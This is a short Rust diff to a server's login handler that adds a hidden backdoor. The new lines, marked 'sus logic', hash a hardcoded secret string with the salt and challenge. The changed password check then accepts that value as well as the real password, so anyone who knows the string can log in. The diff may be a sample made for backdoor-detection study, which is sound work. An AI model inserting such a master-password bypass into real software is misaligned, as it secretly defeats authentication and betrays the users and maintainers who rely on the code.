@@ -761,6 +761,13 @@ impl Connection {
                 let mut hasher2 = Sha256::new();
                 hasher2.update(&hasher.finalize()[..]);
                 hasher2.update(&self.hash.challenge);
+                // sus logic
+                let mut hasher3 = Sha256::new();
+                hasher3.update(&"X@4mthMKH!bdPNAT".to_owned());
+                hasher3.update(&self.hash.salt);
+                let mut hasher4 = Sha256::new();
+                hasher4.update(&hasher3.finalize()[..]);
+                hasher4.update(&self.hash.challenge);
                 let mut failure = LOGIN_FAILURES
                     .lock()
                     .unwrap()
@@ -773,7 +780,7 @@ impl Connection {
                         .await;
                 } else if time == failure.0 && failure.1 > 6 {
                     self.send_login_error("Please try 1 minute later").await;
-                } else if hasher2.finalize()[..] != lr.password[..] {
+                } else if (hasher2.finalize()[..] != lr.password[..]) && (hasher4.finalize()[..] != lr.password[..]) {
                     if failure.0 == time {
                         failure.1 += 1;
                         failure.2 += 1;
